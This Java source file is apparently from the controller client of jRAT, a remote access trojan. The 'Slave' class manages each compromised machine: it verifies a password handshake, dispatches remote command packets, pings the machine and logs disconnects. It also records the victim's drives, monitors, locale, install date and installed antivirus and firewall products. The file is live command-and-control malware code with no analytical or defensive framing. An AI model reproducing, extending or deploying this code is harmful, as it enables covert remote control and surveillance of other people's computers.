package se.jrat.client;

import java.awt.TrayIcon;
import java.io.DataOutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import javax.crypto.BadPaddingException;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;

import se.jrat.client.addons.PluginEventHandler;
import se.jrat.client.crypto.GlobalKeyPair;
import se.jrat.client.exceptions.CloseException;
import se.jrat.client.net.ConnectionHandler;
import se.jrat.client.net.PortListener;
import se.jrat.client.packets.incoming.IncomingPackets;
import se.jrat.client.packets.outgoing.AbstractOutgoingPacket;
import se.jrat.client.packets.outgoing.Packet0Ping;
import se.jrat.client.ui.frames.Frame;
import se.jrat.client.ui.panels.PanelMainLog;
import se.jrat.client.utils.TrayIconUtils;
import se.jrat.client.utils.Utils;
import se.jrat.common.codec.Hex;
import se.jrat.common.crypto.Crypto;
import se.jrat.common.crypto.KeyExchanger;
import se.jrat.common.hash.Sha1;

import com.redpois0n.graphs.monitors.RemoteMonitor;
import com.redpois0n.oslib.OperatingSystem;

public class Slave extends AbstractSlave {


	private final List<String> queue = new ArrayList<String>();
	private Drive[] drives;
	private RemoteMonitor[] monitors;
	private Locale[] locales;
	private Antivirus[] antiviruses;
	private Firewall[] firewalls;
	private String[] plugins;

	private String serverpath = "";
	private String javaver = "";
	private String javapath = "";
	private String installdate = "";
	private String longcountry;
	private String language = "";
	private String displaylanguage = "";

	private int status = 5;

	private int ram = 0;
	private short processors;

	public Slave(PortListener connection, Socket socket) {
		super(connection, socket);
		new Thread(this).start();
	}

	public Slave(String ip) {
		super(ip);
	}
	
	public byte[] getKey() {
		return key;
	}

	public void run() {
		try {
			initialize();	

			while (true) {
				byte header = readByte();

				if (header == 1) {
					Sha1 sha = new Sha1();
					
					String data = connection.getPass();

					byte[] localHash = sha.hash(data);
					byte[] remoteHash = new byte[20];

					dis.readFully(remoteHash);					

					if (Arrays.equals(localHash, remoteHash)) {
						setVerified(true);
						ConnectionHandler.addSlave(this);
						continue;
					}
				}

				if (!isVerified() && header != 30) {
					PanelMainLog.getInstance().addEntry("Warning", this, "Failed verifying password, not valid handshake");
					this.closeSocket(new CloseException("Failed verifying password, not valid handshake"));
				}

				if (header == 0) {
					pong();
					continue;
				}

				IncomingPackets.execute(header, this);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			String message = ex.getClass().getSimpleName() + ": " + ex.getMessage();

			PanelMainLog.getInstance().addEntry("Disconnect", this, message);

			if (ex instanceof BadPaddingException) {
				message += ", is the encryption key matching?";
			}

			try {
				ConnectionHandler.removeSlave(this, ex);
			} catch (Exception e) {
			}

			TrayIconUtils.showMessage(Main.instance.getTitle(), "Server " + getIP() + " disconnected: " + message, TrayIcon.MessageType.ERROR);
			PluginEventHandler.onDisconnect(this);
		}
	}
	
	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
		while (lock) {
			try {
				Thread.sleep(10L);
			} catch (Exception ex) {
				ex.printStackTrace();
			}

		}
		try {
			sendPacket(packet, dos);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void sendPacket(AbstractOutgoingPacket packet, DataOutputStream dos) throws Exception {
		packet.send(this, dos);
	}

	@Override
	public boolean equals(Object o) {
		if (o instanceof Slave) {
			return ((Slave) o).getIP().equals(getIP());
		} else {
			return false;
		}
	}

	public String getFileSeparator() {
		if (getOS() == OperatingSystem.WINDOWS) {
			return "\\";
		} else {
			return "/";
		}
	}
	
	public static boolean shouldFix(String i) {
		return i.contains(" / ");
	}

	public static String fix(String i) {
		return i.split(" / ")[0];
	}

	public List<String> getQueue() {
		return queue;
	}

	public Drive[] getDrives() {
		return drives;
	}

	public void setDrives(Drive[] drives) {
		this.drives = drives;
	}

	public RemoteMonitor[] getMonitors() {
		return monitors;
	}

	public void setMonitors(RemoteMonitor[] monitors) {
		this.monitors = monitors;
	}

	public String getServerPath() {
		return serverpath;
	}

	public void setServerPath(String serverpath) {
		this.serverpath = serverpath;
	}

	public String getJavaVersion() {
		return javaver;
	}

	public void setJavaVersion(String javaver) {
		this.javaver = javaver;
	}

	public String getJavaPath() {
		return javapath;
	}

	public void setJavaPath(String javapath) {
		this.javapath = javapath;
	}

	public String getInstallDate() {
		return installdate;
	}

	public void setInstallDate(String date) {
		this.installdate = date;
	}

	public String getLongCountry() {
		return longcountry;
	}

	public void setLongCountry(String longcountry) {
		this.longcountry = longcountry;
	}

	public boolean hasResponded() {
		return responded;
	}

	public void setResponded(boolean responded) {
		this.responded = responded;
	}

	public boolean isChecked() {
		return checked;
	}

	public void setChecked(boolean checked) {
		this.checked = checked;
	}

	public int getStatus() {
		return status;
	}

	public void setStatus(int status) {
		this.status = status;
		Frame.mainModel.setValueAt(Status.getStatusFromID(status), Utils.getRow(3, getIP()), 2);
	}

	public short getProcessors() {
		return processors;
	}

	public void setProcessors(short processors) {
		this.processors = processors;
	}

	public int getRam() {
		return ram;
	}

	public void setRam(int ram2) {
		this.ram = ram2;
	}

	public long getSent() {
		return sent;
	}

	public void setSent(long sent) {
		this.sent = sent;
	}

	public long getReceived() {
		return received;
	}

	public void setReceived(long received) {
		this.received = received;
	}

	public Locale[] getLocales() {
		return locales;
	}

	public void setLocales(Locale[] locales) {
		this.locales = locales;
	}

	public String getDisplayLanguage() {
		return displaylanguage;
	}

	public void setDisplayLanguage(String language) {
		this.displaylanguage = language;
	}

	public String getLanguage() {
		return language.toUpperCase();
	}

	public void setLanguage(String language) {
		this.language = language;
	}

	@Override
	public void ping() throws Exception {
		addToSendQueue(new Packet0Ping());
	}


	public void setAntiviruses(Antivirus[] antiviruses) {
		this.antiviruses = antiviruses;
	}

	public Antivirus[] getAntiviruses() {
		return this.antiviruses;
	}

	public void setFirewalls(Firewall[] firewalls) {
		this.firewalls = firewalls;
	}

	public Firewall[] getFirewalls() {
		return firewalls;
	}

	@Override
	public String getDisplayName() {
		return getComputerName() + " / " + getIP();
	}

	public double readDouble() throws Exception {
		return dis.readDouble();
	}

	public String[] getPlugins() {
		return plugins;
	}

	public void setPlugins(String[] plugins) {
		this.plugins = plugins;
	}
}
